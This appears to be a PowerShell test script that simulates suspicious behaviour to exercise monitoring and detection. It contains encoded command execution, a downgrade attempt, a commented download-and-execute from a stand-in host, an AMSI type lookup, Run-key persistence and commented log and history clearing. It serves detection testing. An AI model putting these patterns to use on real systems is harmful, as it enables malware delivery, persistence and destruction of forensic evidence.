# Test PowerShell script with suspicious patterns for monitoring detection

# Normal code
function Write-Log {
    param(
        [string]$Message
    )
    Write-Host $Message
}

Write-Log "Starting normal script execution..."

# Suspicious patterns below

# Pattern 1: Obfuscated command execution
$encodedCommand = "V3JpdGUtSG9zdCAiVGhpcyBjb21tYW5kIHdhcyBleGVjdXRlZCBmcm9tIGVuY29kZWQgY29udGVudCI="
powershell -EncodedCommand $encodedCommand

# Pattern 2: PowerShell downgrade attempt
if($PSVersionTable.PSVersion.Major -ge 3) {
    Write-Log "Attempting to use PowerShell 2.0 (downgrade)"
    # powershell.exe -Version 2 -Command "Write-Host 'Running in PowerShell 2.0'"
}

# Pattern 3: Suspicious download and execution
function Download-Execute {
    $url = "https://example.com/suspicious.ps1"
    $outPath = "$env:TEMP\temp_script.ps1"
    try {
        # Commented out to prevent actual execution
        # (New-Object System.Net.WebClient).DownloadFile($url, $outPath)
        # & $outPath
        Write-Log "Would have downloaded and executed from $url"
    } catch {
        Write-Log "Download failed: $_"
    }
}

# Pattern 4: AMSI bypass attempt (obfuscated)
$a = [Ref].Assembly.GetTypes()
$types = "System.Management.Automation.AmsiUtils"
$types = $types.Split(",")
foreach($t in $a) {
    if($t.Name -like "*" + $types[0] + "*") {
        $t | Get-Member -Static | Out-Null
        # Would attempt to bypass AMSI
    }
}

# Pattern 5: Persistence via registry
function Add-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = "SystemService"
    $value = "powershell.exe -WindowStyle hidden -Command `"& {Start-Process notepad.exe}`""
    
    # Commented out to prevent actual modification
    # if(!(Test-Path $regPath)) {
    #     New-Item -Path $regPath -Force | Out-Null
    # }
    # New-ItemProperty -Path $regPath -Name $name -Value $value -PropertyType String -Force | Out-Null
    
    Write-Log "Would have added persistence via $regPath"
}

# Pattern 6: Anti-forensics
function Clear-Tracks {
    # Clear event logs
    # Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
    
    # Clear PowerShell history
    # Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    
    Write-Log "Would have cleared forensic evidence"
}

# Execute functions (most are just simulations)
Write-Log "Executing test functions..."
Download-Execute
Add-Persistence
Clear-Tracks

Write-Log "Script execution completed" 